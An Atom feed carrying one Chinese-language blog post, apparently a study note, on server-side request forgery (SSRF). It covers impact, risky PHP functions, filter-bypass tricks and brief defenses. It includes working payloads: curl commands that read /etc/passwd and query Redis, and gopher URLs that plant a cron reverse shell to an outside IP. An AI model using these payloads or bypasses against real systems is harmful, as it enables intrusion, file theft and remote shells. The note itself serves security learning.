<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://mobius-0.github.io</id>
    <title>Khala • Posts by &#34;ssrf&#34; tag</title>
    <link href="https://mobius-0.github.io" />
    <updated>2022-11-26T08:59:44.000Z</updated>
    <category term="Hexo" />
    <category term="shoya" />
    <category term="网站" />
    <category term="网络安全" />
    <category term="工具" />
    <category term="虚拟机" />
    <category term="安全" />
    <category term="星际争霸2" />
    <category term="平衡" />
    <category term="杂谈" />
    <category term="小说" />
    <category term="江南" />
    <category term="龙族" />
    <category term="动画" />
    <category term="法律法规" />
    <category term="XSS" />
    <category term="漏洞" />
    <category term="渗透测试" />
    <category term="靶场" />
    <category term="pikachu" />
    <category term="标准" />
    <category term="OCI" />
    <category term="CRI" />
    <category term="HTTP" />
    <category term="计算机网络" />
    <category term="IPSec" />
    <category term="VPN" />
    <category term="SSL" />
    <category term="TLS" />
    <category term="WiFi" />
    <category term="邮件" />
    <category term="网络协议" />
    <category term="Linux" />
    <category term="渗透" />
    <category term="信息收集" />
    <category term="痕迹清理" />
    <category term="Windows" />
    <category term="内网" />
    <category term="后门" />
    <category term="免杀" />
    <category term="代理" />
    <category term="Shell" />
    <category term="远程连接" />
    <category term="入侵检测" />
    <category term="IDS" />
    <category term="IPS" />
    <category term="防御加固" />
    <category term="管理策略" />
    <category term="分工" />
    <category term="职能" />
    <category term="情报" />
    <category term="运营" />
    <category term="应急响应" />
    <category term="流程" />
    <category term="攻击溯源" />
    <category term="分析模型" />
    <category term="网络攻防" />
    <category term="蜜罐" />
    <category term="隐藏" />
    <category term="诱导" />
    <category term="防御纵深" />
    <category term="访问控制" />
    <category term="过滤" />
    <category term="框架" />
    <category term="风险" />
    <category term="控制" />
    <category term="CSRF" />
    <category term="服务器" />
    <category term="SQL注入" />
    <category term="SSRF" />
    <category term="Cache" />
    <category term="XXE" />
    <category term="XML" />
    <category term="Xpath" />
    <category term="注入" />
    <category term="函数" />
    <category term="绕过" />
    <category term="遍历" />
    <category term="包含" />
    <category term="文件" />
    <category term="目录" />
    <category term="读取" />
    <category term="上传" />
    <category term="中间件" />
    <category term="IIS" />
    <category term="Apache" />
    <category term="Nginx" />
    <category term="域名" />
    <category term="DNS" />
    <category term="WEB" />
    <category term="虚拟化" />
    <category term="Docker" />
    <category term="镜像" />
    <category term="逻辑" />
    <category term="策略配置" />
    <category term="ASP" />
    <category term="CSharp" />
    <category term="Golang" />
    <category term="Java" />
    <category term="语言" />
    <category term="反序列化" />
    <category term="混淆" />
    <category term="沙箱" />
    <category term="类" />
    <category term="JDK" />
    <category term="开发过程" />
    <category term="JavaScript" />
    <category term="PHP" />
    <category term="PowerShell" />
    <category term="Python" />
    <category term="Ruby" />
    <category term="端口" />
    <category term="社会工程学" />
    <category term="搜索" />
    <entry>
        <id>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/</id>
        <title>SSRF</title>
        <link rel="alternate" href="https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/"/>
        <content type="html">&lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。&lt;/p&gt;
&lt;h2 id=&#34;漏洞危害&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞危害&#34;&gt;#&lt;/a&gt; 漏洞危害&lt;/h2&gt;
&lt;p&gt;SSRF 可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用 File 协议读取本地文件。&lt;/p&gt;
&lt;p&gt;内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在 SSRF 时，通常会造成较大的危害。&lt;/p&gt;
&lt;h1 id=&#34;利用方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用方式&#34;&gt;#&lt;/a&gt; 利用方式&lt;/h1&gt;
&lt;p&gt;SSRF 利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。&lt;/p&gt;
&lt;p&gt;以 curl 为例，可以使用 dict 协议操作 Redis、file 协议读文件、gopher 协议反弹 Shell 等功能，常见的 Payload 如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -vvv &#39;dict://127.0.0.1:6379/info&#39;

curl -vvv &#39;file:///etc/passwd&#39;

# * 注意: 链接使用单引号，避免$变量问题

curl -vvv &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/103.21.140.84/6789 0&amp;gt;&amp;amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;相关危险函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关危险函数&#34;&gt;#&lt;/a&gt; 相关危险函数&lt;/h1&gt;
&lt;p&gt;SSRF 涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以 PHP 为例，涉及到的函数有  &lt;code&gt;file_get_contents()&lt;/code&gt;  /  &lt;code&gt;fsockopen()&lt;/code&gt;  /  &lt;code&gt;curl_exec()&lt;/code&gt;  等。&lt;/p&gt;
&lt;h1 id=&#34;过滤绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过滤绕过&#34;&gt;#&lt;/a&gt; 过滤绕过&lt;/h1&gt;
&lt;h2 id=&#34;更改ip地址写法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更改ip地址写法&#34;&gt;#&lt;/a&gt; 更改 IP 地址写法&lt;/h2&gt;
&lt;p&gt;一些开发者会通过对传过来的 URL 参数进行正则匹配的方式来过滤掉内网 IP，如采用如下正则表达式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;3&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;2&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&amp;#123;2&amp;#125;$&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于这种过滤我们采用改编 IP 的写法的方式进行绕过，例如 192.168.0.1 这个 IP 地址可以被改写成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;8 进制格式：0300.0250.0.1&lt;/li&gt;
&lt;li&gt;16 进制格式：0xC0.0xA8.0.1&lt;/li&gt;
&lt;li&gt;10 进制整数格式：3232235521&lt;/li&gt;
&lt;li&gt;16 进制整数格式：0xC0A80001&lt;/li&gt;
&lt;li&gt;合并后两位：1.1.278 / 1.1.755&lt;/li&gt;
&lt;li&gt;合并后三位：1.278 / 1.755 / 3.14159267&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外 IP 中的每一位，各个进制可以混用。&lt;/p&gt;
&lt;p&gt;访问改写后的 IP 地址时，Apache 会报 400 Bad Request，但 Nginx、MySQL 等其他服务仍能正常工作。&lt;/p&gt;
&lt;p&gt;另外，0.0.0.0 这个 IP 可以直接访问到本地，也通常被正则过滤遗漏。&lt;/p&gt;
&lt;h2 id=&#34;使用解析到内网的域名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用解析到内网的域名&#34;&gt;#&lt;/a&gt; 使用解析到内网的域名&lt;/h2&gt;
&lt;p&gt;如果服务端没有先解析 IP 再过滤内网地址，我们就可以使用 localhost 等解析到内网的域名。&lt;/p&gt;
&lt;p&gt;另外  &lt;code&gt;xip.io&lt;/code&gt;  提供了一个方便的服务，这个网站的子域名会解析到对应的 IP，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS0xOTItdWMwZXA5NmIuMTY4LjAuMS54aXAuaW8=&#34;&gt;例如 192.168.0.1.xip.io&lt;/span&gt;，解析到 192.168.0.1。&lt;/p&gt;
&lt;h2 id=&#34;利用解析url所出现的问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用解析url所出现的问题&#34;&gt;#&lt;/a&gt; 利用解析 URL 所出现的问题&lt;/h2&gt;
&lt;p&gt;在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。&lt;/p&gt;
&lt;p&gt;比如  &lt;code&gt;http://www.baidu.com@192.168.0.1/&lt;/code&gt;  当后端程序通过不正确的正则表达式（比如将 http 之后到 com 为止的字符内容，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS13d3cta2Q5ZHc1NGRzOW4uYmFpZHUuY29t&#34;&gt;也就是 www.baidu.com&lt;/span&gt;，认为是访问请求的 host 地址时）对上述 URL 的内容进行解析的时候，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1VUkxob3N0d3d3LXh4MnBoYTcxMGExdHpvNjRiZ2R6YWM5OGN3bnlib2s0YnFwYTY5N28uYmFpZHUuY29t&#34;&gt;很有可能会认为访问 URL 的 host 为 www.baidu.com&lt;/span&gt;，而实际上这个 URL 所请求的内容都是 192.168.0.1 上的内容。&lt;/p&gt;
&lt;h2 id=&#34;利用跳转&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用跳转&#34;&gt;#&lt;/a&gt; 利用跳转&lt;/h2&gt;
&lt;p&gt;如果后端服务器在接收到参数后，正确的解析了 URL 的 host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。&lt;/p&gt;
&lt;p&gt;可以使用如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2h0dHBiaW4ub3JnL3JlZGlyZWN0LXRvP3VybD1odHRwOi8vMTkyLjE2OC4wLjE=&#34;&gt;http://httpbin.org/redirect-to?url=http://192.168.0.1&lt;/span&gt; 等服务跳转，但是由于 URL 中包含了 192.168.0.1 这种内网 IP 地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。&lt;/p&gt;
&lt;p&gt;常用的跳转有 302 跳转和 307 跳转，区别在于 307 跳转会转发 POST 请求中的数据等，但是 302 跳转不会。&lt;/p&gt;
&lt;h2 id=&#34;通过各种非http协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过各种非http协议&#34;&gt;#&lt;/a&gt; 通过各种非 HTTP 协议&lt;/h2&gt;
&lt;p&gt;如果服务器端程序对访问 URL 所采用的协议进行验证的话，可以通过非 HTTP 协议来进行利用。&lt;/p&gt;
&lt;p&gt;比如通过 gopher，可以在一个 url 参数中构造 POST 或者 GET 请求，从而达到攻击内网应用的目的。例如可以使用 gopher 协议对与内网的 Redis 服务进行攻击，可以使用如下的 URL：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &amp;gt;&amp;amp; /dev/tcp/172.19.23.228/23330&amp;gt;&amp;amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;除了 gopher 协议，File 协议也是 SSRF 中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似  &lt;code&gt;file:///path/to/file&lt;/code&gt;  这种格式来访问计算机本地文件。使用 file 协议可以避免服务端程序对于所访问的 IP 进行的过滤。例如我们可以通过  &lt;code&gt;file:///d:/1.txt&lt;/code&gt;  来访问 D 盘中 1.txt 的内容。&lt;/p&gt;
&lt;h2 id=&#34;dns-rebinding&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-rebinding&#34;&gt;#&lt;/a&gt; DNS Rebinding&lt;/h2&gt;
&lt;p&gt;一个常用的防护思路是：对于用户请求的 URL 参数，首先服务器端会对其进行 DNS 解析，然后对于 DNS 服务器返回的 IP 地址进行判断，如果在黑名单中，就禁止该次请求。&lt;/p&gt;
&lt;p&gt;但是在整个过程中，第一次去请求 DNS 服务进行域名解析到第二次服务端去请求 URL 之间存在一个时间差，利用这个时间差，可以进行 DNS 重绑定攻击。&lt;/p&gt;
&lt;p&gt;要完成 DNS 重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的 DNS Server，在我们的可控的 DNS Server 上编写解析服务，设置 TTL 时间为 0。这样就可以进行攻击了，完整的攻击流程为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器端获得 URL 参数，进行第一次 DNS 解析，获得了一个非内网的 IP&lt;/li&gt;
&lt;li&gt;对于获得的 IP 进行判断，发现为非黑名单 IP，则通过验证&lt;/li&gt;
&lt;li&gt;服务器端对于 URL 进行访问，由于 DNS 服务器设置的 TTL 为 0，所以再次进行 DNS 解析，这一次 DNS 服务器返回的是内网地址。&lt;/li&gt;
&lt;li&gt;由于已经绕过验证，所以服务器端返回访问内网资源的结果。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;利用ipv6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用ipv6&#34;&gt;#&lt;/a&gt; 利用 IPv6&lt;/h2&gt;
&lt;p&gt;有些服务没有考虑 IPv6 的情况，但是内网又支持 IPv6，则可以使用 IPv6 的本地 IP 如  &lt;code&gt;[::]&lt;/code&gt;   &lt;code&gt;0000::1&lt;/code&gt;  或 IPv6 的内网域名来绕过过滤。&lt;/p&gt;
&lt;h2 id=&#34;利用idn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用idn&#34;&gt;#&lt;/a&gt; 利用 IDN&lt;/h2&gt;
&lt;p&gt;一些网络访问工具如 Curl 等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。&lt;/p&gt;
&lt;p&gt;在这些字符中，部分字符会在访问时做一个等价转换，例如  &lt;code&gt;ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ&lt;/code&gt;  和  &lt;code&gt;example.com&lt;/code&gt;  等同。利用这种方式，可以用  &lt;code&gt;① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩&lt;/code&gt;  等字符绕过内网限制。&lt;/p&gt;
&lt;h1 id=&#34;可能的利用点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可能的利用点&#34;&gt;#&lt;/a&gt; 可能的利用点&lt;/h1&gt;
&lt;h2 id=&#34;内网服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网服务&#34;&gt;#&lt;/a&gt; 内网服务&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Apache Hadoop 远程命令执行&lt;/li&gt;
&lt;li&gt;axis2-admin 部署 Server 命令执行&lt;/li&gt;
&lt;li&gt;Confluence SSRF&lt;/li&gt;
&lt;li&gt;counchdb WEB API 远程命令执行&lt;/li&gt;
&lt;li&gt;dict&lt;/li&gt;
&lt;li&gt;docker API 远程命令执行&lt;/li&gt;
&lt;li&gt;Elasticsearch 引擎 Groovy 脚本命令执行&lt;/li&gt;
&lt;li&gt;ftp /ftps（FTP 爆破）&lt;/li&gt;
&lt;li&gt;glassfish 任意文件读取和 war 文件部署间接命令执行&lt;/li&gt;
&lt;li&gt;gopher&lt;/li&gt;
&lt;li&gt;HFS 远程命令执行&lt;/li&gt;
&lt;li&gt;http、https&lt;/li&gt;
&lt;li&gt;imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）&lt;/li&gt;
&lt;li&gt;Java 调试接口命令执行&lt;/li&gt;
&lt;li&gt;JBOSS 远程 Invoker war 命令执行&lt;/li&gt;
&lt;li&gt;Jenkins Scripts 接口命令执行&lt;/li&gt;
&lt;li&gt;ldap&lt;/li&gt;
&lt;li&gt;mongodb&lt;/li&gt;
&lt;li&gt;php_fpm/fastcgi 命令执行&lt;/li&gt;
&lt;li&gt;rtsp - smb/smbs（连接 SMB）&lt;/li&gt;
&lt;li&gt;sftp&lt;/li&gt;
&lt;li&gt;ShellShock 命令执行&lt;/li&gt;
&lt;li&gt;Struts2 命令执行&lt;/li&gt;
&lt;li&gt;telnet&lt;/li&gt;
&lt;li&gt;tftp（UDP 协议扩展）&lt;/li&gt;
&lt;li&gt;tomcat 命令执行&lt;/li&gt;
&lt;li&gt;WebDav PUT 上传任意文件&lt;/li&gt;
&lt;li&gt;WebSphere Admin 可部署 war 间接命令执行&lt;/li&gt;
&lt;li&gt;zentoPMS 远程命令执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;redis利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#redis利用&#34;&gt;#&lt;/a&gt; Redis 利用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;写 ssh 公钥&lt;/li&gt;
&lt;li&gt;写 crontab&lt;/li&gt;
&lt;li&gt;写 WebShell&lt;/li&gt;
&lt;li&gt;Windows 写启动项&lt;/li&gt;
&lt;li&gt;主从复制加载 .so 文件&lt;/li&gt;
&lt;li&gt;主从复制写无损文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;云主机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#云主机&#34;&gt;#&lt;/a&gt; 云主机&lt;/h2&gt;
&lt;p&gt;在 AWS、Google 等云环境下，通过访问云环境的元数据 API 或管理 API，在部分情况下可以实现敏感信息等效果。&lt;/p&gt;
&lt;h1 id=&#34;防御方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御方式&#34;&gt;#&lt;/a&gt; 防御方式&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;过滤返回的信息&lt;/li&gt;
&lt;li&gt;统一错误信息&lt;/li&gt;
&lt;li&gt;限制请求的端口&lt;/li&gt;
&lt;li&gt;禁止不常用的协议&lt;/li&gt;
&lt;li&gt;对 DNS Rebinding，考虑使用 DNS 缓存或者 Host 白名单&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy45MXJpLm9yZy8xNzExMS5odG1s&#34;&gt;SSRF 漏洞分析与利用&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvdGh1cnNkYXkvdXMtMTctVHNhaS1BLU5ldy1FcmEtT2YtU1NSRi1FeHBsb2l0aW5nLVVSTC1QYXJzZXItSW4tVHJlbmRpbmctUHJvZ3JhbW1pbmctTGFuZ3VhZ2VzLnBkZg==&#34;&gt;A New Era Of SSRF&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3BocC1zc3JmLXRlY2huaXF1ZXMtOWQ0MjJjYjI4ZDUx&#34;&gt;php ssrf technique&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUFlUSE9OL2RlZmVuZC1zc3JmLXZ1bG5lcmFibGUtaW4tcHl0aG9uLmh0bWw=&#34;&gt;谈一谈如何在 Python 开发中拒绝 SSRF 漏洞&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cuc2FmZWJ1ZmYuY29tLzIwMTYvMDcvMDMvU1NSRi1UaXBzLw==&#34;&gt;SSRF Tips&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qb3ljaG91Lm9yZy93ZWIvcGhwc3NyZi5odG1s&#34;&gt;SSRF in PHP&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="网络安全" />
        <category term="漏洞" />
        <category term="SSRF" />
        <updated>2022-11-26T08:59:44.000Z</updated>
    </entry>
</feed>
